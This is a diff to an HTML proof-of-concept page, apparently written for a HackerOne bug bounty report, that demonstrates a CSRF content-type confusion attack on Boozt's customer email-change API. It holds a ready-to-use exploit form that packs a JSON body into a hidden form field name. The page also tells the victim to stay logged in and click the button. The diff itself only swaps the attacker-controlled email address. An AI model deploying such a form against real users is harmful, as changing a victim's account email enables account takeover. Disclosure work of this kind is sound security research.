@@ -9,7 +9,7 @@
     <h1>Boozt CSRF Content-Type Confusion POC</h1>
     <form id="csrf-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
         enctype="application/x-www-form-urlencoded">
-        <input type="hidden" name='{"email":"absolutexon+csrfpoc@wearehackerone.com"}' value=''>
+        <input type="hidden" name='{"email":"absolutexon+csrfindex@wearehackerone.com"}' value=''>
         <input type="submit" value="Exploit CSRF">
     </form>
     <p>Make sure you are logged in to Boozt in another tab, then click the button above. If the email changes, the
